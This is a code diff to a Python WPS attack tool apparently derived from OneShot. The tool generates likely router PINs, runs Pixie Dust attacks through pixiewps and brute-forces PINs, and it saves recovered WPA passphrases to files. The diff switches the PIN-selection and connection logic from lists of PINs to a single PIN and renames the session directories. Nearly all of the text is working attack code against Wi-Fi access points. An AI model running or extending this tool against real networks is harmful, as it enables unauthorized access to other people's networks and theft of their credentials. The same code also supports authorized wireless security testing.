@@ -220,7 +220,7 @@ class WPSpin:
     def getLikely(self, mac):
         res = self.getSuggestedList(mac)
         if res:
-            return res
+            return res[0]
         else:
             return None
         
@@ -555,22 +555,13 @@ class Companion:
         self.connection_status = ConnectionStatus()
 
         user_home = str(pathlib.Path.home())
-        try:
-            self.sessions_dir = f'{user_home}/.KillShot/sessions/'
-            self.pixiewps_dir = f'{user_home}/.KillShot/pixiewps/'
-            self.reports_dir = os.path.dirname(os.path.realpath(__file__)) + '/reports/'
-            if not os.path.exists(self.sessions_dir):
-                os.makedirs(self.sessions_dir)
-            if not os.path.exists(self.pixiewps_dir):
-                os.makedirs(self.pixiewps_dir)
-        except PermissionError:
-            self.sessions_dir = f'./.KillShot/sessions/'
-            self.pixiewps_dir = f'./.KillShot/pixiewps/'
-            self.reports_dir = os.path.dirname(os.path.realpath(__file__)) + '/reports/'
-            if not os.path.exists(self.sessions_dir):
-                os.makedirs(self.sessions_dir)
-            if not os.path.exists(self.pixiewps_dir):
-                os.makedirs(self.pixiewps_dir)
+        self.sessions_dir = f'{user_home}/.OneShot/sessions/'
+        self.pixiewps_dir = f'{user_home}/.OneShot/pixiewps/'
+        self.reports_dir = os.path.dirname(os.path.realpath(__file__)) + '/reports/'
+        if not os.path.exists(self.sessions_dir):
+            os.makedirs(self.sessions_dir)
+        if not os.path.exists(self.pixiewps_dir):
+            os.makedirs(self.pixiewps_dir)
 
         self.generator = WPSpin()
 
@@ -758,16 +749,14 @@ class Companion:
             csvWriter.writerow([dateStr, bssid, essid, wps_pin, wpa_psk])
         print(f'[i] Credentials saved to {filename}.txt, {filename}.csv')
 
-    def __savePin(self, bssid, pins):
+    def __savePin(self, bssid, pin):
         filename = self.pixiewps_dir + '{}.run'.format(bssid.replace(':', '').upper())
         with open(filename, 'w') as file:
-            for pin in pins:
-                file.write(pin)
+            file.write(pin)
         print('[i] PIN saved in {}'.format(filename))
 
     def __prompt_wpspin(self, bssid):
         pins = self.generator.getSuggested(bssid)
-        selectedPins = []
         if len(pins) > 1:
             print(f'PINs generated for {bssid}:')
             print('{:<3} {:<10} {:<}'.format('#', 'PIN', 'Name'))
@@ -779,31 +768,10 @@ class Companion:
             while 1:
                 pinNo = input('Select the PIN: ')
                 try:
-                    if ('-' in pinNo or ',' in pinNo) or ('-' in pinNo and ',' in pinNo):
-                        pinNos = pinNo.split(',')
-                        for ciclePinNo in pinNos:
-                            if '-' in ciclePinNo:
-                                startPin = int(ciclePinNo.split("-")[0])
-                                stopPin = int(ciclePinNo.split("-")[1])
-                                for rangePinNo in range(startPin, stopPin+1):
-                                    if int(rangePinNo) in range(1, len(pins)+1):
-                                        pin = pins[int(rangePinNo) - 1]['pin']
-                                        selectedPins.append(pin)
-                                    else:
-                                        raise IndexError
-                            else:
-                                if int(ciclePinNo) in range(1, len(pins)+1):
-                                    pin = pins[int(ciclePinNo) - 1]['pin']
-                                    selectedPins.append(pin)
-                                else:
-                                    raise IndexError
-
+                    if int(pinNo) in range(1, len(pins)+1):
+                        pin = pins[int(pinNo) - 1]['pin']
                     else:
-                        if int(pinNo) in range(1, len(pins)+1):
-                            pin = pins[int(pinNo) - 1]['pin']
-                            selectedPins.append(pin)
-                        else:
-                            raise IndexError
+                        raise IndexError
                 except Exception:
                     print('Invalid number')
                 else:
@@ -812,11 +780,9 @@ class Companion:
             pin = pins[0]
             print('[i] The only probable PIN is selected:', pin['name'])
             pin = pin['pin']
-            selectedPins.append(pin)
         else:
             return None
-        print(f'[i] Selected PINs: {", ".join(selectedPins)}')
-        return selectedPins
+        return pin
 
     def __wps_connection(self, bssid=None, pin=None, pixiemode=False, pbc_mode=False, verbose=None):
         if not verbose:
@@ -852,60 +818,44 @@ class Companion:
                 break
 
         self.sendOnly('WPS_CANCEL')
-        if self.connection_status.status == 'GOT_PSK':
-            return pin
         return False
 
-    def single_connection(self, bssid=None, ssid=None, pins=None, pixiemode=False, pbc_mode=False, showpixiecmd=False,
+    def single_connection(self, bssid=None, ssid=None, pin=None, pixiemode=False, pbc_mode=False, showpixiecmd=False,
                           pixieforce=False, store_pin_on_fail=False):
-        successPin = None
-        if not pins:
+        if not pin:
             if pixiemode:
                 try:
                     # Try using the previously calculated PIN
                     filename = self.pixiewps_dir + '{}.run'.format(bssid.replace(':', '').upper())
-                    t_pins = []
                     with open(filename, 'r') as file:
-                        t_pins = file.readlines()
-                        for i, pin in enumerate(t_pins):
-                            t_pins[i] = t_pins[i].strip()
-                        if input('[?] Use previously calculated PIN {}? [n/Y] '.format(', '.join(t_pins))).lower() != 'n':
-                            pins = t_pins
+                        t_pin = file.readline().strip()
+                        if input('[?] Use previously calculated PIN {}? [n/Y] '.format(t_pin)).lower() != 'n':
+                            pin = t_pin
                         else:
                             raise FileNotFoundError
                 except FileNotFoundError:
-                    pins = self.generator.getLikely(bssid) or ['12345670']
+                    pin = self.generator.getLikely(bssid) or '12345670'
             elif not pbc_mode:
                 # If not pixiemode, ask user to select a pin from the list
-                pins = self.__prompt_wpspin(bssid) or ['12345670']
+                pin = self.__prompt_wpspin(bssid) or '12345670'
         if pbc_mode:
-            sPin = self.__wps_connection(bssid, pbc_mode=pbc_mode)
+            self.__wps_connection(bssid, pbc_mode=pbc_mode)
             bssid = self.connection_status.bssid
-            pins = ['<PBC mode>']
-            successPin = '<PBC mode>'
+            pin = '<PBC mode>'
         elif store_pin_on_fail:
             try:
-                for pin in pins:
-                    sPin = self.__wps_connection(bssid, pin, pixiemode)
-                    if sPin:
-                        successPin = sPin
-                        break
-
+                self.__wps_connection(bssid, pin, pixiemode)
             except KeyboardInterrupt:
                 print("\nAborting…")
-                self.__savePin(bssid, pins)
+                self.__savePin(bssid, pin)
                 return False
         else:
-            for pin in pins:
-                sPin = self.__wps_connection(bssid, pin, pixiemode)
-                if sPin:
-                    successPin = sPin
-                    break
+            self.__wps_connection(bssid, pin, pixiemode)
 
         if self.connection_status.status == 'GOT_PSK':
-            self.__credentialPrint(successPin, self.connection_status.wpa_psk, self.connection_status.essid)
+            self.__credentialPrint(pin, self.connection_status.wpa_psk, self.connection_status.essid)
             if self.save_result:
-                self.__saveResult(bssid, self.connection_status.essid, successPin, self.connection_status.wpa_psk)
+                self.__saveResult(bssid, self.connection_status.essid, pin, self.connection_status.wpa_psk)
             if not pbc_mode:
                 # Try to remove temporary PIN file
                 filename = self.pixiewps_dir + '{}.run'.format(bssid.replace(':', '').upper())
@@ -918,7 +868,7 @@ class Companion:
             if self.pixie_creds.got_all():
                 pin = self.__runPixiewps(showpixiecmd, pixieforce)
                 if pin:
-                    return self.single_connection(bssid, pins=[pin], pixiemode=False, store_pin_on_fail=True)
+                    return self.single_connection(bssid, pin, pixiemode=False, store_pin_on_fail=True)
                 return False
             else:
                 print('[!] Not enough data to run Pixie Dust attack')
@@ -1430,14 +1380,11 @@ if __name__ == '__main__':
                     if args.bruteforce:
                         companion.smart_bruteforce(args.bssid, args.pin, args.delay)
                     else:
-                        pins = None
-                        if args.pin:
-                            pins = args.pin.split(',')
                         if args.ssid:
-                            companion.single_connection(bssid=args.bssid, ssid=args.ssid, pins=pins, pixiemode=args.pixie_dust,
+                            companion.single_connection(bssid=args.bssid, ssid=args.ssid, pin=args.pin, pixiemode=args.pixie_dust,
                                                     showpixiecmd=args.show_pixie_cmd, pixieforce=args.pixie_force)
                         else:
-                            companion.single_connection(bssid=args.bssid, pins=pins, pixiemode=args.pixie_dust,
+                            companion.single_connection(bssid=args.bssid, pin=args.pin, pixiemode=args.pixie_dust,
                                                     showpixiecmd=args.show_pixie_cmd, pixieforce=args.pixie_force)
             if not args.loop:
                 break
